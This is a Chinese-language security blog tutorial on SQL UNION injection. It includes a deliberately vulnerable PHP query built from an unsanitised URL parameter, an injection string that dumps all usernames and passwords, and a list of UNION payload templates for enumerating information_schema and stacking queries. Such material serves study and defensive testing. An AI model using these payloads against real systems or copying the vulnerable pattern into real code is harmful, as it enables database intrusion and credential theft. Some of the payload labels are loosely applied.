# 原创
：  【sql注入-union注入】 union函数 联合注入

# 【sql注入-union注入】 union函数 联合注入

**目录**

[union注入](#extractvalue%28%29%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5)

[一、语法介绍：](#%E4%B8%80%E3%80%81%E8%AF%AD%E6%B3%95%E4%BB%8B%E7%BB%8D%EF%BC%9A)

[二、代码示例](#%E4%BA%8C%E3%80%81%E6%8A%A5%E9%94%99%E5%8E%9F%E5%9B%A0)

[网络安全O](#%E4%B8%89%E3%80%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%B0%8F%E5%9C%88%E5%AD%90)

---


## union注入

### 一、语法介绍：

版本：

union函数是SQL语言中的一个操作符，用于将两个或多个查询结果合并成一个结果集。它适用于几乎所有主流的关系型数据库管理系统（RDBMS）

如所有的：MySQL、Oracle、Microsoft SQL Server、PostgreSQL、SQLite等关系型数据库

---


语法：

```
SELECT column1, column2 FROM table1 
UNION 
SELECT column1, column2 FROM table2;
```

使用SELECT语句来查询两个或多个表中的数据。然后，使用UNION关键字将这些查询结果合并在一起

（注：被合并的查询结果具有相同的列数和相似的数据类型。如果查询结果的列数不同或者数据类型不兼容，将会导致错误）

---


 

作用：
1. 合并结果集：当我们需要将多个查询结果合并成一个结果集时，可以使用union函数。这样可以简化查询操作，减少代码的复杂性。1. 去重数据：union函数会自动去重，即将重复的行从结果集中剔除，只返回唯一的行。这在需要对两个或多个表中的数据进行合并，并消除重复数据时非常有用。1. 扩展查询：使用union函数可以将多个查询结果合并在一起，从而扩展查询的范围。我们可以在每个SELECT语句中使用不同的条件和过滤器，从不同的表中获取数据，并将它们合并成一个结果集
---


---


### 二、代码示例

示例：

```
&lt;?php
// 获取用户输入
$id = $_GET['id'];

// 构造SQL查询语句
$sql = "SELECT * FROM users WHERE id = " . $id;

// 执行SQL查询
$result = mysqli_query($conn, $sql);

// 处理查询结果
if ($result) {
    // 输出查询结果
    while ($row = mysqli_fetch_assoc($result)) {
        echo "用户名: " . $row['username'] . "&lt;br&gt;";
        echo "密码: " . $row['password'] . "&lt;br&gt;";
    }
} else {
    // 输出错误信息
    echo "查询失败";
}
?&gt;

```

用户可以通过URL中的`id`参数来指定要查询的用户ID。然而，由于代码中没有对`$id`进行任何过滤或验证，攻击者可以在`id`参数中注入恶意的SQL代码。

可将`id的`参数注入恶意代码，如下

```
1' UNION SELECT username, password FROM users--
```

那么构造的SQL查询语句将变为：

```
SELECT * FROM users WHERE id = 1' UNION SELECT username, password FROM users--'

```

将会返回所有用户的用户名和密码，绕过了原本的查询条件

通过联合注入漏洞获取敏感信息，或者进行其他恶意操作

---


payload：

1、基于联合查询的union注入：

```
' UNION SELECT column1, column2, column3 FROM table_name--
```

2、基于错误的union注入：

```
' UNION ALL SELECT NULL, NULL, NULL, table_name FROM information_schema.tables--
```

3、基于盲注的union注入：

```
' UNION ALL SELECT NULL, (SELECT concat(table_name,0x0a,column_name) FROM information_schema.columns WHERE table_name='表名' LIMIT 1 OFFSET 0)#
```

4、基于堆叠查询的union注入：

```
'; SELECT 1,2,3 UNION ALL SELECT column1, column2, column3 FROM table_name--
```

…………

每一种sql注入的方法都可以尝试与union进行结合

---


---


## 网络安全O

[README.md · 书半生/网络安全知识体系-实战中心 - 码云 - 开源中国 (gitee.com)正在上传…重新上传取消https://gitee.com/shubansheng/Treasure_knowledge/blob/master/README.md<img alt="icon-default.png?t=N658" src="https://csdnimg.cn/release/blog_editor_html/release2.3.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N658"/>https://gitee.com/shubansheng/Treasure_knowledge/blob/master/README.md](https://gitee.com/shubansheng/Treasure_knowledge/blob/master/README.md)

[GitHub - BLACKxZONE/Treasure_knowledge<img alt="icon-default.png?t=N658" src="https://csdnimg.cn/release/blog_editor_html/release2.3.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=N658"/>https://github.com/BLACKxZONE/Treasure_knowledge](https://github.com/BLACKxZONE/Treasure_knowledge)
